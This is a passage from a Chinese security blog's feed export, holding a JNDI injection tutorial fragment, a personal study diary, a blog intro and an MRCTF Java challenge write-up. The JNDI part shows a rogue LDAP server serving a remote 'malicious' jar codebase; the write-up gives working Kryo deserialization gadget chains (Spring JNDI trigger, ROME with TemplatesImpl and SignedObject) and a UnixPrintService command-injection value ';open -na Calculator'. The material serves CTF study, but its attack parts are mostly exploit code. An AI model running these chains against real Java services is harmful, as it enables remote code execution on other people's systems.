class="type">String</span> <span class="variable">LDAP_ENTRY_NAME</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="comment">// 获取LDAP服务地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">LDAP_URL</span> <span class="operator">=</span> <span class="string">&quot;ldap://&quot;</span> + BIND_HOST + <span class="string">&quot;:&quot;</span> + SERVER_PORT + <span class="string">&quot;/&quot;</span> + LDAP_ENTRY_NAME;</span><br><span class="line"><span class="comment">// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REMOTE_REFERENCE_JAR</span> <span class="operator">=</span> <span class="string">&quot;https://anbai.io/tools/jndi-test.jar&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP基底DN</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=javasec,dc=org&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 创建LDAP配置对象</span></span><br><span class="line"><span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP监听配置信息</span></span><br><span class="line">config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line"><span class="string">&quot;listen&quot;</span>, InetAddress.getByName(BIND_HOST), SERVER_PORT,</span><br><span class="line">ServerSocketFactory.getDefault(), SocketFactory.getDefault(),</span><br><span class="line">(SSLSocketFactory) SSLSocketFactory.getDefault())</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加自定义的LDAP操作拦截器</span></span><br><span class="line">config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建LDAP服务对象</span></span><br><span class="line"><span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务</span></span><br><span class="line">ds.startListening();</span><br><span class="line">System.out.println(<span class="string">&quot;LDAP服务启动成功,服务地址：&quot;</span> + LDAP_URL);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">base</span>  <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line"><span class="type">Entry</span>  <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 设置对象的工厂类名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.anbai.sec.jndi.injection.ReferenceObjectFactory&quot;</span>;</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, className);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, className);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置远程的恶意引用对象的jar地址</span></span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, REMOTE_REFERENCE_JAR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP objectClass</span></span><br><span class="line">entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line"></span><br><span class="line">result.sendSearchEntry(entry);</span><br><span class="line">result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">e1.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">// 获取RMI绑定的恶意ReferenceWrapper对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(LDAP_URL);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure><p><code>ds.add(&quot;en=avv&quot;,object)</code>,可以绑定对象了就。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>攻击类型</th><th>适用jdk版本</th><th>需要条件</th></tr></thead><tbody><tr><td>JNDI+RMI (Reference Remote Factory)</td><td>&lt;7u21、6u45</td><td>无</td></tr><tr><td>JNDI+RMI (Reference Local Factory)</td><td>任意</td><td>调用端存在利用链</td></tr><tr><td>JNDI+LDAP (Reference Remote Codebase)</td><td>&lt;8u191</td><td>无</td></tr><tr><td>JNDI+LDAP (Serialize Object)</td><td>任意</td><td>调用端存在反序列化链</td></tr></tbody></table></li></ul><h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><blockquote><p>1.高版本bypass<a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></p><p>2.eki-rmi:<a href="https://tttang.com/archive/1430/">https://tttang.com/archive/1430/</a></p><p>3.eki-ldap: <a href="https://tttang.com/archive/1441/">https://tttang.com/archive/1441/</a></p><p>4.<a href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a></p><p>5.绕过：<a href="https://www.cnblogs.com/zpchcbd/p/14941783.html">https://www.cnblogs.com/zpchcbd/p/14941783.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dem0のdiary</title>
      <link href="/2022/05/30/Dem0%E3%81%AEdiary/"/>
      <url>/2022/05/30/Dem0%E3%81%AEdiary/</url>
      
        <content type="html"><![CDATA[<h1 id="Dem0のdiary"><a href="#Dem0のdiary" class="headerlink" title="Dem0のdiary"></a>Dem0のdiary</h1><blockquote><p>最近太闲了，啥也在看，啥也没学会，开个blog激励一下自己。(致敬sakura!)争取365天拿下科恩offer！</p></blockquote><h2 id="2022-x2F-05-x2F-31"><a href="#2022-x2F-05-x2F-31" class="headerlink" title="2022&#x2F;05&#x2F;31"></a>2022&#x2F;05&#x2F;31</h2><ul><li><p>学习</p><p>啥也没学.png，预计到6.8号之前估计都不会更新这个模块。(考试咕咕)</p></li><li><p>杂事</p><p>开启了blog,希望自己能够坚持下去，也坚持学下去。</p></li></ul><h2 id="2022-x2F-06-x2F-06"><a href="#2022-x2F-06-x2F-06" class="headerlink" title="2022&#x2F;06&#x2F;06"></a>2022&#x2F;06&#x2F;06</h2><ul><li><p>学习</p><p>这周末主要学习了洛谷8道算法(高精度和模拟)+java的SSTI注入，发现了一个神仙paper，后面会仔细研究一下，因为考虑到还有几个java的引擎还没有学习到，所以我打算先学完(主要是一边看一边在出题)</p></li><li><p>杂事</p><p>这个端午打LOL和几位大哥一起恰了饭(dengfeng猛carry！)</p></li></ul><h2 id="2022-x2F-06-x2F-09"><a href="#2022-x2F-06-x2F-09" class="headerlink" title="2022&#x2F;06&#x2F;09"></a>2022&#x2F;06&#x2F;09</h2><ul><li><p>学习</p><p>昨天是妥妥地摆了一天，一直在写物联网技术开发的作业，复习了<code>HTML+JS+CSS(前端🐕都不写)</code>.</p></li><li><p>杂事</p><p>熬夜真的伤身体，给大家推荐一下,<a href="https://github.com/zijie0/HumanSystemOptimization">健康生活150岁</a>。</p><p>写稿也要注意自己的技巧。</p><p><img src="https://c.img.dasctf.com/images/2022610/1654827608348-73df3e83-c7bb-452d-aa11-907277045ff5.png" alt="image-20220610102007380"></p></li></ul><h2 id="2022-x2F-06-x2F-10"><a href="#2022-x2F-06-x2F-10" class="headerlink" title="2022&#x2F;06&#x2F;10"></a>2022&#x2F;06&#x2F;10</h2><ul><li><p>学习</p><p>今天是学习了一天物联网的简易开发实验，简单编程吧(~)</p></li><li><p>杂事</p><p>今天，在学习java的时候，又渐渐地迷失了方向，每次机械的复现漏洞，感觉学习到的东西真的很有限很有限。</p><blockquote><ol><li>怕麻烦，觉得这个环境麻烦，那个操作麻烦</li><li>怕代码，不爱动手，害怕动手</li><li>机械式复现，无论是打payload，还是动手跟着调试，都处于一种机械复现</li><li>缺少自信，认为rce很高端</li><li>沉迷学习，缺少实践</li></ol></blockquote></li></ul><p>​漂亮鼠师傅的《年轻人如何挖掘自己第一个RCE》，我又看了一遍，也不知道到底看了几遍了，就感觉学习效率很低。平时课程已经压得我喘不过气了。我之前就是单纯地复现复现<code>F8</code>工具人，这几次在复现<code>SSTI</code>的时候，开始写了几篇文章，挖了几个好玩的trick出了题，收获颇多。但是感觉效率不是很好，感觉要学习的还是很多，一定避免自己陷入了学习的误区。</p><p>​今天我也想了一个新的方式，之前每次都是先确定我要学这个方向的漏洞，我才开始收集文章，但是实际上我平时有意无意就翻到了很多的好文章。或者说我前几天突然想学一个方向，但是当我闲下来的时候，我又感觉方向很多，不知道从何入手。这里就是<code>TODO</code>起作用了，也是我新建那个仓库的主要作用，记录自己的进度，和自己突然迸发的<code>idea</code>和突然看到的好文章。希望现在可以开始！！</p><ul><li><p>TODO</p><blockquote><p>mssql不出网:<a href="https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w">https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w</a></p></blockquote></li></ul><h2 id="2022-x2F-06-x2F-11"><a href="#2022-x2F-06-x2F-11" class="headerlink" title="2022&#x2F;06&#x2F;11"></a>2022&#x2F;06&#x2F;11</h2><ul><li><p>学习</p><p>出了一个题目<del>+解了一个pwnhub的题目</del>+两道算法题~+终结了实验报告~~~</p></li><li><p>杂事</p><p>没什么杂事~~~</p></li></ul><h2 id="2022-x2F-06-x2F-12"><a href="#2022-x2F-06-x2F-12" class="headerlink" title="2022&#x2F;06&#x2F;12"></a>2022&#x2F;06&#x2F;12</h2><ul><li><p>学习</p><p>java模板注入类型的基本上都完成了，beetel和jinjajava的SSTI,我选择直接看payload，没什么意思。问题基本上都已经找到了答案。</p><p>:key:还差一个模板注入50页的pdf还没看。</p></li><li><p>杂事</p><p>裸考CCF！！</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About new Blog</title>
      <link href="/2022/05/30/aboutAgo/"/>
      <url>/2022/05/30/aboutAgo/</url>
      
        <content type="html"><![CDATA[<h1 id="About-new-blog"><a href="#About-new-blog" class="headerlink" title="About new blog"></a>About new blog</h1><h2 id="Q-为什么新建博客？"><a href="#Q-为什么新建博客？" class="headerlink" title="Q: 为什么新建博客？"></a>Q: 为什么新建博客？</h2><blockquote><p> 小白文写着确实没什么收获，后续自己在看到相同的问题的时候也不好回想。(最近太闲了，</p></blockquote><h2 id="Q-发水文"><a href="#Q-发水文" class="headerlink" title="Q: 发水文?"></a>Q: 发水文?</h2><blockquote><p> 尽量保证博客中发的都是高质量爽文，保证质，但是不保证量，顶个flag(一周能复现一篇高质量！)</p></blockquote><h2 id="Q-写什么？"><a href="#Q-写什么？" class="headerlink" title="Q: 写什么？"></a>Q: 写什么？</h2><blockquote><p>心情好，想写什么写什么。</p></blockquote><h2 id="Q：之前没有写过文章吗？之前的好文呢？"><a href="#Q：之前没有写过文章吗？之前的好文呢？" class="headerlink" title="Q：之前没有写过文章吗？之前的好文呢？"></a>Q：之前没有写过文章吗？之前的好文呢？</h2><blockquote><p>CSDN:<a href="https://blog.csdn.net/anwen12">https://blog.csdn.net/anwen12</a></p><p>github: <a href="https://github.com/3em0/java_3em0">https://github.com/3em0/java_3em0</a></p><p>强烈推荐github，小白入门系列。</p></blockquote><h2 id="Q-友链"><a href="#Q-友链" class="headerlink" title="Q: 友链"></a>Q: 友链</h2><blockquote><p> link_list:<br>    - name: in1t<br>      link: <a href="https://in1t.top/">https://in1t.top</a><br>      avatar: <a href="https://in1t.top/img/avatar.jpg">https://in1t.top/img/avatar.jpg</a><br>      descr: 一只对二进制感兴趣的菜鸡</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF-java部分</title>
      <link href="/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF-java部分"><a href="#MRCTF-java部分" class="headerlink" title="MRCTF-java部分"></a>MRCTF-java部分</h1><h2 id="0x01-springcoffee"><a href="#0x01-springcoffee" class="headerlink" title="0x01 springcoffee"></a>0x01 springcoffee</h2><h3 id="1-题目"><a href="#1-题目" class="headerlink" title="1. 题目"></a>1. 题目</h3><p>拿到源码之后，不用多说的只有两个控制器是其中最关键的地方<kbd>/order</kbd><kbd>/demo</kbd>,其他的地方并没有什么太多的利用点。</p><p>其中<code>/order</code>是触发反序列化的地方，<code>/demo</code>是<code>set</code>可以修改kryo中的一些配置。</p><h3 id="2-做题"><a href="#2-做题" class="headerlink" title="2. 做题"></a>2. 做题</h3><p>经典的一个百度搜索+狗狗搜索，只有两篇还算的是有用的链接。</p><blockquote><p>1.<a href="https://cloud.tencent.com/developer/article/1624416">https://cloud.tencent.com/developer/article/1624416</a></p><p>2.<a href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/#Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/#Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p></blockquote><p>然后还有marshalsec的一段话</p><p><img src="https://img.dem0dem0.top/images/image-20220531181159793.png" alt="image-20220531181159793"></p><p>​上面这么多的信息是不是已经有一点眼花缭乱了，没关系，下面我来给大家整理一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Kryo 默认的配置只允许反序列化那些默认的有空参构造函数的类，(据说这样可以抵制许多的gadget)，但是里面也提供其他的支持(org.objenesis.strategy.StdInstantiatorStrategy)</span><br><span class="line">2.可以利用的payloads</span><br><span class="line">BeanComp ==&gt;commutil</span><br><span class="line">SpringBFAdv ==&gt; spring aop (这个是通了)</span><br><span class="line">ROME ==&gt; (有依赖)</span><br></pre></td></tr></table></figure><p>本地因为懒，没有去翻mar的这个pdf文档，所以在比赛的时候也没有去找到ROME这条链子，所以在比赛的时候当时不出网也就没有继续做下去了(其实是太懒了，当时去抖了~~~~).</p><p>下面放一下SpringBFAdv的exp(不出网就没法利用了，这个主要是打jndi的)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BeanFactory <span class="title function_">makeJNDITrigger</span> <span class="params">(String jndiUrl )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line">        Reflections.setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        <span class="keyword">return</span> bf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeBeanFactoryTriggerBFPA</span> <span class="params">( String name, BeanFactory bf )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">pcadv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        pcadv.setBeanFactory(bf);</span><br><span class="line">        pcadv.setAdviceBeanName(name);</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        c.setAdviceBeanName(name);</span><br><span class="line">        c.setBeanFactory(bf);</span><br><span class="line">        <span class="keyword">return</span> makeMap(pcadv, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">byte</span>[] genpayload1()<span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> makeBeanFactoryTriggerBFPA(jndiUrl, makeJNDITrigger(jndiUrl));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2022426/1650960191749-530973b0-300a-4726-8596-5dc570531fb3.png" alt="image-20220426160311823"></p><p>一个小细节，相信大家都知道了。</p><h3 id="3-正确解法"><a href="#3-正确解法" class="headerlink" title="3. 正确解法"></a>3. 正确解法</h3><p>ROME链子不出网，肯定就要糊一个加载字节码的东西出来。<code>TemplatesImpl</code>，他来了</p><p>先赛一个exp出来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] genpayload() <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;genByteCode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, obj);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> makeMap(root, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后就报错了</p><p><img src="https://c.img.dasctf.com/images/2022426/1650976995489-6f72ab36-5146-4a1d-9a25-cad9445d5ed6.png" alt="image-20220426204307520"></p><p>这是和虎符一样的空指针报错，处理方法和虎符是一样的。signedObject</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()&#125;);</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">       setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, obj);</span><br><span class="line">       <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line">       <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">       setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,root);</span><br><span class="line">       KeyPairGenerator keyPairGenerator;</span><br><span class="line">       keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">       keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">       <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">       <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">       <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">       <span class="type">SignedObject</span> <span class="variable">so</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       so = <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line">       <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(SignedObject.class, so);</span><br><span class="line">       <span class="type">ObjectBean</span>  <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">       <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> makeMap(ob, ob);</span><br></pre></td></tr></table></figure><p>这是🐉哥的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//        ObjectBean delegate = new ObjectBean(Templates.class, obj);</span></span><br><span class="line"><span class="comment">//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap = makeMap(root,root);</span></span><br><span class="line"><span class="comment">//        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        keyPairGenerator.initialize(1024);</span></span><br><span class="line"><span class="comment">//        KeyPair keyPair = keyPairGenerator.genKeyPair();</span></span><br><span class="line"><span class="comment">//        PrivateKey privateKey = keyPair.getPrivate();</span></span><br><span class="line"><span class="comment">//        Signature signature = Signature.getInstance(privateKey.getAlgorithm());</span></span><br><span class="line"><span class="comment">//        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);</span></span><br><span class="line"><span class="comment">//        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap1 = makeMap(root1,root1);</span></span><br></pre></td></tr></table></figure><p>感觉优雅一丢丢。然后后面的就懂得都懂了。这里就已经可以任意代码执行了（绕rasp就不说了。</p><blockquote><p>rasp那个的绕过，一个就是直接</p><p>第二个就是<code>UnixPrintService</code>的get链子调用</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个糊到ROME链子里面问题不大把</span></span><br><span class="line">Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(sun.print.UnixPrintService.class,</span><br><span class="line">declaredConstructor.newInstance(<span class="string">&quot;;open -na Calculator&quot;</span>));</span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">root</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span 